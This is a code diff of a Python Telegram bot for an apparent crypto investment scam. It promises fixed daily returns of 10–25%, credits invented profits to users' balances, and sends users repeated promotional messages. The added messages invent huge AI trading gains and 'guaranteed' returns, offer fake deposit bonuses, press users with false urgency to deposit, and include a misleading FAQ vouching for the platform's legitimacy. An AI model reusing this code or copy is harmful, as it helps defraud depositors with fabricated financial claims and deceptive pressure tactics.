@@ -28,13 +28,22 @@ cursor.execute('''
 ''')
 conn.commit()
 
+# Sigurno dodavanje kolone total_withdrawn (bez IF NOT EXISTS)
+try:
+    cursor.execute("ALTER TABLE users ADD COLUMN total_withdrawn REAL DEFAULT 0")
+    conn.commit()
+except sqlite3.OperationalError:
+    pass  # Kolona već postoji
+
 def get_or_create_user(user_id: int):
     cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
     user = cursor.fetchone()
     if not user:
         cursor.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
         conn.commit()
-        return (user_id, 0.0, 0.0, 0.0, "Not Activated")
+        return (user_id, 0.0, 0.0, 0.0, "Not Activated", 0.0)
+    if len(user) < 6:
+        return user + (0.0,)
     return user
 
 def update_balance(user_id: int, amount: float):
@@ -63,7 +72,10 @@ def set_plan(user_id: int, plan_name: str):
 
 def get_user(user_id: int):
     cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
-    return cursor.fetchone()
+    user = cursor.fetchone()
+    if user and len(user) < 6:
+        return user + (0.0,)
+    return user
 
 def reset_total_deposited(user_id: int):
     cursor.execute("UPDATE users SET total_deposited = 0 WHERE user_id = ?", (user_id,))
@@ -73,15 +85,19 @@ def reset_total_profit(user_id: int):
     cursor.execute("UPDATE users SET total_profit = 0 WHERE user_id = ?", (user_id,))
     conn.commit()
 
+def update_total_withdrawn(user_id: int, amount: float):
+    cursor.execute("UPDATE users SET total_withdrawn = total_withdrawn + ? WHERE user_id = ?", (amount, user_id))
+    conn.commit()
+
 # ==================== ADMIN ID ====================
 ADMIN_ID = 8327782517
 
 WELCOME_VIDEO = "https://files.catbox.moe/4b0psz.mp4"
 
 PLANS = {
-    "plan_normal": {"name": "Normal Plan", "percent": 10 "text": "💰 <b>Normal Plan Activated</b>\n\n📊 Plan Highlights:\n• Daily Returns: 10%\n• Compounding: Not Included\n•  Period: 30 days \n• Bot Access: Ongoing\n\n💵 Activation Requirement: Deposit $100 minimum.\n\nPlease enter your desired deposit amount:"},
-    "plan_premium": {"name": "Premium Plan", "percent": 15 "text": "💰 <b>Premium Plan Activated</b>\n\n📊 Plan Highlights:\n• Daily Returns: 15%\n• Compounding: Not Included\n•  Period: 30 days  \n• Bot Access: Ongoing\n\n💵 Activation Requirement: Deposit $500 to start enjoying Premium benefits.\n\nPlease enter your desired deposit amount:"},
-    "plan_diamond": {"name": "Diamond Plan", "percent": 25 "text": "💎 <b>Diamond Plan Activated</b>\n\n📊 Plan Highlights:\n• Daily Returns: 25%\n• Compounding: Available\n•  Period: 30 days \n• Bot Access: Ongoing\n\n💵 Activation Requirement: Deposit $1500 to start enjoying Diamond benefits.\n\nPlease enter your desired deposit amount:"},
+    "plan_normal": {"name": "Normal Plan", "percent": 10, "text": "💰 <b>Normal Plan Activated</b>\n\n📊 Plan Highlights:\n• Daily Returns: 10%\n• Compounding: Not Included\n• Period: 30 days\n• Bot Access: Ongoing\n\n💵 Activation Requirement: Deposit $100 minimum.\n\nPlease enter your desired deposit amount:"},
+    "plan_premium": {"name": "Premium Plan", "percent": 15, "text": "💰 <b>Premium Plan Activated</b>\n\n📊 Plan Highlights:\n• Daily Returns: 15%\n• Compounding: Not Included\n• Period: 30 days\n• Bot Access: Ongoing\n\n💵 Activation Requirement: Deposit $500 to start enjoying Premium benefits.\n\nPlease enter your desired deposit amount:"},
+    "plan_diamond": {"name": "Diamond Plan", "percent": 25, "text": "💎 <b>Diamond Plan Activated</b>\n\n📊 Plan Highlights:\n• Daily Returns: 25%\n• Compounding: Available\n• Period: 30 days\n• Bot Access: Ongoing\n\n💵 Activation Requirement: Deposit $1500 to start enjoying Diamond benefits.\n\nPlease enter your desired deposit amount:"},
 }
 
 user_state = {}
@@ -112,7 +128,7 @@ Our automated AI system just closed an explosive 100X long on NIGHTUSDT, catchin
 Every minute you wait is another missed 1,000%+ move.
 
 👉 Make your deposit now and let the bot catch the next trade automatically.""",
-        "delay_minutes": 17
+        "delay_minutes": 12
     },
     {
         "photo": "https://files.catbox.moe/ppftvb.jpg",
@@ -141,14 +157,14 @@ Most users will NEVER see this bonus.
 
 🚀 PRESS DEPOSIT NOW 
 Claim your 100X bonus before your spot is given to someone else.""",
-        "delay_minutes": 117
+        "delay_minutes": 182
     }
 ]
 
 PROMO_REPEATING = [
     {
         "photo": "https://files.catbox.moe/8pcfqm.jpg",
-        "caption": """🚨 LIMITED SPOTS – INSANE 10X MULTIPLIER OFFER JUST DROPPED! 🚨
+        "caption": """🚨 LIMITED SPOTS – INSANE 25X DEPOSIT BONUS OFFER JUST DROPPED! 🚨
 
 💸 Turn Your Deposit into a Fortune — Starting from JUST $100! This is your chance to multiply your balance like never before, but you MUST act NOW. Time is running out!
 
@@ -156,7 +172,7 @@ Here’s what’s waiting for you:
 🔥 Deposit $100 ➡️ Get $1,000 (10X)
 🔥 Deposit $200 ➡️ Get $3,000 (15X)
 🔥 Deposit $500 ➡️ Get $10,000 (20X)
-🔥 Deposit $1000 ➡️ Get $50,000 (50X)
+🔥 Deposit $1000 ➡️ Get $25,000 (25X)
 
 🧠 You've already joined the bot — now it's time to take the next step and unlock REAL GAINS!
 
@@ -190,11 +206,181 @@ Our automated AI system just closed an explosive 100X long on ROLLUSDT, catching
 ⚡ The next high-ROI setup is already loading…
 Every minute you wait is another missed 1,000%+ move.
 
-👉 Make your deposit now and let the bot catch the next trade automatically.
-
-💬 Press below to contact support if you have any questions."""
+👉 Make your deposit now and let the bot catch the next trade automatically."""
     },
-    # ... (sve ostale tvoje PROMO_REPEATING poruke su tu)
+    {
+        "photo": "https://files.catbox.moe/pgwql9.jpg",
+        "caption": """🔍 How It Works — Pure Passive Income
+
+Our AI trading bot earns you up to 25% daily — fully automated. No charts. No effort. Just profits.
+
+🧠 Smart AI, Real Results
+Trained on 4+ years of crypto data, our bot detects patterns, tracks global news, and reacts instantly — just like a pro trader.
+
+📊 Trades That Follow the Money
+It scans 100+ top coins and Solana tokens, locking into where momentum builds.
+All trades run on secure DEXs with built-in risk controls — keeping your capital safe.
+
+⚙️ You Do Nothing. It Earns Everything.
+START WITH JUST $200 — EARN $10 DAILY.
+Withdraw anytime, straight to your crypto wallet. Instant, private, and safe.
+
+🔎 Transparent From Day One
+After deposit, you’ll see real-time performance: trades, accuracy, and profit.
+
+🚀 Ready to Earn While You Sleep?
+Your crypto, our AI. Let’s grow it daily.
+Deposit now — and start earning today."""
+    },
+    {
+        "photo": "https://files.catbox.moe/d5of20.jpg",
+        "caption": """💥 TRADE UPDATE — +6,267% ROI SECURED ON SPCUSDT 💥
+
+Our automated AI system just closed an explosive 100X long on SPCUSDT, catching the entire move with perfect precision and zero emotions.
+
+📊 Trade Summary
+• Pair: SPCUSDT
+• Position: Long
+• Leverage: 100X
+• Return: +6,267% ROI ✅
+
+💰 Potential Profit Examples:
+• Deposit $500 → $31,835 profit
+• Deposit $1,000 → $63,670 profit
+
+✅ Instant withdrawals — profits always available
+✅ Thousands of users earn daily from these automated trades
+
+⚡ The next high-ROI setup is already loading…
+Every minute you wait is another missed 1,000%+ move.
+
+👉 Make your deposit now and let the bot catch the next trade automatically."""
+    },
+    {
+        "photo": "https://files.catbox.moe/x9mrcr.jpg",
+        "caption": """🌟 Good Morning, Users! 🌟
+
+📈 Yesterday was phenomenal! Our bot achieved incredible success, generating an impressive +150,000% ($155,000,000) in returns! 🚀
+
+🎉 Exciting Update: The bot delivered an outstanding 150,000% return to users yesterday, surpassing expectations and significantly growing investments. One user even earned a remarkable $2,000,000 in just one day! Stay tuned—some amazing bonuses are on the way today!
+
+💼 Your Opportunity Awaits: Start with as little as $100, and enjoy consistent daily returns of 25%—guaranteed. This is your chance to take control and transform your financial future!
+
+📩 Need Help? Our friendly support team is available 24/7 to answer any questions or assist with anything you need. 
+
+📢 Join Our Community & See the Results for Yourself! Check out real user reviews and live trade updates.
+
+💡 Make today the day you invest in your future and unlock steady growth. Start now!"""
+    },
+    {
+        "photo": "https://files.catbox.moe/tt5yqt.jpg",
+        "caption": """💥 TRADE UPDATE — +5,000.00% ROI SECURED ON FOG USDT 💥
+
+Our automated AI system just closed an explosive 100X long on FOG USDT, catching the entire move with perfect precision and zero emotions.
+
+📊 Trade Summary
+• Pair: FOG USDT
+• Position: Long
+• Leverage: 100X
+• Return: +5,000.00% ROI ✅
+
+💰 Potential Profit Examples:
+• Deposit $500 → $25,500 profit
+• Deposit $1,000 → $51,000 profit
+
+✅ Instant withdrawals — profits always available
+✅ Thousands of users earn daily from these automated trades
+
+⚡️ The next high-ROI setup is already loading…
+Every minute you wait is another missed 1,000%+ move.
+
+👉 Make your deposit now and let the bot catch the next trade automatically."""
+    },
+    {
+        "photo": "https://files.catbox.moe/xe9lr4.jpg",
+        "caption": """THE BOT JUST CLOSED A LIFE-CHANGING TRADE 💥
+
+😳 +9,755.00%😳
+
+Our users made over $98,550 in minutes — and they started with just $1000.
+
+Yes, fully automated. No effort. No stress. Just profits.
+
+While you’re still thinking, others are out here printing generational wealth — on autopilot.
+
+The bot trades for you, generating 25% daily returns, scaling up to +1,000% and beyond.
+
+You’re literally one step away.
+Press DEPOSIT now to activate your bot and start earning real money automatically.
+
+Stop watching. Start winning.
+Time is money — don’t waste either."""
+    },
+    {
+        "photo": "https://files.catbox.moe/zxkh9b.jpg",
+        "caption": """💥 TRADE UPDATE — +2,103.00% ROI SECURED ON DEGEN USDT 💥
+
+Our automated AI system just closed an explosive 100X long on DEGEN USDT, catching the entire move with perfect precision and zero emotions.
+
+📊 Trade Summary
+• Pair: DEGEN USDT
+• Position: Long
+• Leverage: 100X
+• Return: +2,103.00% ROI ✅
+
+💰 Potential Profit Examples:
+• Deposit $500 → $11,015 profit
+• Deposit $1,000 → $22,030 profit
+
+✅ Instant withdrawals — profits always available
+✅ Thousands of users earn daily from these automated trades
+
+⚡ The next high-ROI setup is already loading…
+Every minute you wait is another missed 1,000%+ move.
+
+👉 Make your deposit now and let the bot catch the next trade automatically."""
+    },
+    
+    {
+        "photo": "https://files.catbox.moe/seaaol.jpg",
+        "caption": """📖 Frequently Asked Questions
+
+❓ How do I know you're legit?
+AI Automated Trading is a trusted platform with years of experience in automated crypto trading. We prioritize transparency, security, and user satisfaction. Join thousands of satisfied users worldwide who are already earning daily profits.
+
+❓ Where can I check reviews?
+You can tap ✅ User Reviews in the menu. All reviews come from real members of our community.
+
+❓ Are there any fees?
+No hidden fees. Deposits and withdrawals are instant and free from our side. Only standard network fee applies.
+
+❓ How do I activate the bot?
+Simply tap 💰 Deposit, choose your crypto, and send funds to your personal deposit address. The bot activates automatically.
+
+❓ What results can I expect?
+• Average 25% daily returns on active capital"""
+    },
+    {
+        "photo": "https://files.catbox.moe/1knfsk.jpg",
+        "caption": """🎉 EXCLUSIVE WINNER ALERT! TURN $150 INTO $15,000🎉
+
+Congratulations! You are one of the fortunate few chosen to receive a life-changing bonus that will never be offered again!
+
+💥 Your Lucky Break:
+Deposit $150 now, and we'll instantly boost your balance to an incredible $15,000! 
+
+This is a PRIVATE reward, activated just for you—not available to the public. 
+
+🔒 Why This Is Special:
+• A mind-blowing 100X bonus that you won’t find anywhere else!
+• No strings attached—no gimmicks, just cold hard cash.
+• This bonus is powerful and extremely limited. Once it’s gone, it’s gone for good!
+
+⏰ Act Fast—Time Is Running Out!
+This invitation can expire at any moment, and once spots are filled, this opportunity will vanish forever. Don’t let this incredible chance slip away!
+
+👉 PRESS DEPOSIT NOW to claim your $15,000 and secure your 100X bonus before it disappears!"""
+    }
 ]
 
 # === SLANJE PROMO PORUKA ===
@@ -216,11 +402,14 @@ async def send_promo_after_start(user_id):
         except:
             pass
 
+    index = 0
     while True:
-        await asyncio.sleep(random.randint(4*3600, 5*3600))
+        await asyncio.sleep(random.randint(3*3600, 4*3600))
 
         try:
-            promo = random.choice(PROMO_REPEATING)
+            promo = PROMO_REPEATING[index % len(PROMO_REPEATING)]
+            index += 1
+
             kb = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="Live Support", url="https://t.me/aitradesupport")],
                 [InlineKeyboardButton(text="💰 Deposit", callback_data="deposit")]
@@ -246,7 +435,6 @@ async def daily_profit_task():
         for user in users:
             user_id, balance, plan_name = user
 
-            # Normalizacija za računanje profita
             clean = plan_name.lower().replace("💎", "").replace("🥇", "").replace("💰", "").strip()
 
             percent = 0
@@ -387,13 +575,16 @@ async def cmd_account(message: types.Message):
     if message.from_user.id in user_state:
         del user_state[message.from_user.id]
     user = get_or_create_user(message.from_user.id)
+    
+    total_withdrawn = user[5] if len(user) > 5 else 0.0
+
     if user[1] > 0 or user[4] != "Not Activated":
         text = (
             "👤 <b>Your Account Dashboard</b>\n\n"
             f"📆 Plan: {user[4]}\n\n"
             f"💰 Balance: ${user[1]:.2f} USDT\n"
             f"💵 Total Deposited: ${user[2]:.2f} USDT\n"
-            f"📤 Total Withdrawn: $0.00 USDT\n"
+            f"📤 Total Withdrawn: ${total_withdrawn:.2f} USDT\n"
             f"📈 Total Profit: ${user[3]:.2f} USDT\n\n"
             "🤖 Bot is being developed for your account...\n"
             "Approx. processing / activation time: ~2 hours\n\n"
@@ -401,6 +592,7 @@ async def cmd_account(message: types.Message):
         )
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="💰 Deposit", callback_data="deposit")],
+            [InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
             [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
         ])
     else:
@@ -409,7 +601,7 @@ async def cmd_account(message: types.Message):
             f"📆 Plan: {user[4]}\n\n"
             f"💰 Balance: ${user[1]:.2f} USDT\n"
             f"💵 Total Deposited: ${user[2]:.2f} USDT\n"
-            f"📤 Total Withdrawn: $0.00 USDT\n"
+            f"📤 Total Withdrawn: ${total_withdrawn:.2f} USDT\n"
             f"📈 Total Profit: ${user[3]:.2f} USDT\n\n"
             "⚡️ Your account is fully set up and ready to go. The only thing missing is your first deposit.\n\n"
             "Every minute your account remains inactive is a missed opportunity to start earning money automatically. Once funded, the bot can begin executing trades on your behalf and generating a daily income of 25%.\n\n"
@@ -419,6 +611,7 @@ async def cmd_account(message: types.Message):
         )
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
+            [InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
             [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
         ])
     await message.answer(text, reply_markup=kb, parse_mode="HTML")
@@ -560,7 +753,7 @@ async def cmd_userinfo(message: types.Message):
     try:
         user = get_user(int(message.text.split()[1]))
         if user:
-            await message.answer(f"👤 ID: {user[0]}\n💰 Balance: ${user[1]:.2f}\n📈 Profit: ${user[3]:.2f}\n📥 Deposited: ${user[2]:.2f}\n📶 Plan: {user[4]}")
+            await message.answer(f"👤 ID: {user[0]}\n💰 Balance: ${user[1]:.2f}\n📈 Profit: ${user[3]:.2f}\n📥 Deposited: ${user[2]:.2f}\n📤 Withdrawn: ${user[5] if len(user) > 5 else 0:.2f}\n📶 Plan: {user[4]}")
     except:
         await message.answer("Format: /userinfo <user_id>")
 
@@ -683,6 +876,7 @@ async def callback_handler(callback: types.CallbackQuery):
     elif data == "account":
         await callback.message.delete()
         user = get_or_create_user(user_id)
+        total_withdrawn = user[5] if len(user) > 5 else 0.0
 
         if user[1] > 0 or user[4] != "Not Activated":
             text = (
@@ -690,7 +884,7 @@ async def callback_handler(callback: types.CallbackQuery):
                 f"📆 Plan: {user[4]}\n\n"
                 f"💰 Balance: ${user[1]:.2f} USDT\n"
                 f"💵 Total Deposited: ${user[2]:.2f} USDT\n"
-                f"📤 Total Withdrawn: $0.00 USDT\n"
+                f"📤 Total Withdrawn: ${total_withdrawn:.2f} USDT\n"
                 f"📈 Total Profit: ${user[3]:.2f} USDT\n\n"
                 "🤖 Bot is being developed for your account...\n"
                 "Approx. processing / activation time: ~2 hours\n\n"
@@ -698,6 +892,7 @@ async def callback_handler(callback: types.CallbackQuery):
             )
             kb = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="💰 Deposit", callback_data="deposit")],
+                [InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
                 [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
             ])
         else:
@@ -706,7 +901,7 @@ async def callback_handler(callback: types.CallbackQuery):
                 f"📆 Plan: {user[4]}\n\n"
                 f"💰 Balance: ${user[1]:.2f} USDT\n"
                 f"💵 Total Deposited: ${user[2]:.2f} USDT\n"
-                f"📤 Total Withdrawn: $0.00 USDT\n"
+                f"📤 Total Withdrawn: ${total_withdrawn:.2f} USDT\n"
                 f"📈 Total Profit: ${user[3]:.2f} USDT\n\n"
                 "⚡️ Your account is fully set up and ready to go. The only thing missing is your first deposit.\n\n"
                 "Every minute your account remains inactive is a missed opportunity to start earning money automatically. Once funded, the bot can begin executing trades on your behalf and generating a daily income of 25%.\n\n"
@@ -716,6 +911,7 @@ async def callback_handler(callback: types.CallbackQuery):
             )
             kb = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
+                [InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
                 [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
             ])
 
@@ -844,6 +1040,7 @@ async def handle_amount(message: types.Message):
                 return
 
             deduct_balance(user_id, amount)
+            update_total_withdrawn(user_id, amount)
 
             text = (
                 "📤 <b>Withdraw Request Received</b>\n\n"
